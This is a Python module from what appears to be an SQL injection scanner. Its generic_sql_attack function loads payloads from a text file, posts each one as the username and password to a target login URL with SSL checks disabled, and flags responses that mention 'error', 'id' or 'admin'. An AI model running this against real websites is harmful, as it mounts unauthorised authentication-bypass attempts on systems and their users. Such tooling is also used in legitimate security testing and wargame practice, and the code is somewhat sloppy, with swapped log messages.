try:
    import sys
    import os
    parent_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.append(parent_dir)
    current_directory = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.abspath(os.path.join(current_directory, '..'))
    sys.path.append(project_root)

    from regelexpression.patterns import Detect


    add_directory = os.path.abspath(os.path.dirname(__file__))

    priority_path = os.path.join(add_directory, '..', 'priority')

    sys.path.append(priority_path)


    from priority.Priority import PRIORITY, HARMFULL


    current_directory = os.path.dirname(os.path.abspath(__file__))
    project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))

    sys.path.append(project_root)

    from logger.logs import logger
    from Exceptions.exceptions import SQLJNGUserExit
    from Exceptions.handler import extract_package_name_from_import_error,Install_missing_packages


    try:
        import asyncio
        import requests 
        from colorama import Fore,init
        import re
        import glob
        import os
        import socket
        import time
        from datetime import datetime
        import sqlite3
        import logging

    except ImportError as e:
        try:
            sys.exit("[!]Missing packages:",e)
        
        except:
            pass

    import sys
    import os
    import logging

except:
    pass

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from logger.sqljlog import logger as sqljlog
from lib.Attacktype.Attacks import AttackType

init()

attack_type = "generic SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""


pattern = r"\\berror\\b"
htmlpattern = r"\\bid\\b"
generic_capture = []



            


async def generic_sql_attack(urls):
    """This attack is when we are able to alter the database tables and gather information out of it"""
    try:
        global pattern,htmlpattern
        #
        filename = "genericsql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls} \n Do you want to send the payload to the website? ")
                logger.info(f"Host is up with the url:{urls}")

                if ask.lower() == "y":
                    sqljlog.info(f"Testing:{AttackType.GENERIC_SQL_INJECTION.value}")
                    for line in sorted_payload.split("\n"):
                        params = {
                            "username": line,
                            "password": line
                        }
                        global ack
                        ack = requests.post(url=urls, data=params,verify=False)
                        logger.info(f"Testing payload :{line} into the target...")
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)

                        
                        if htmlVULN:
                            logger.info(f"Could find error parameter, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)

                            
                    
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find injectable parameter(id), keyword:{line}")
                            Detect(req.text)
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)

                        
                        if errword:
                            logger.info(f"Could find injectable parameter(error), keyword:{line}")
                            Detect(req.text)
                            Detect(ack.text)
                            await asyncio.sleep(3)    
                            html_response.push(ack.text)

                            
                    if req.status_code == 302:
                        logger.info(f"Could inject parameter,keyword:{line},target:{urls}")            
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin, keyword:{line},target:{urls}") 
                        Detect(ack.text)
                        html_response.push(ack.text)

    

    except Exception as e:
        logger.error(f"Error: {str(e)}")
        

    
    except KeyboardInterrupt:
        logger.info("Aborted.")
    
    
 
        
        
    finally:
        logger.info("Done.")
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)


# asyncio.run(generic_sql_attack("https://redtiger.labs.overthewire.org/"))
    



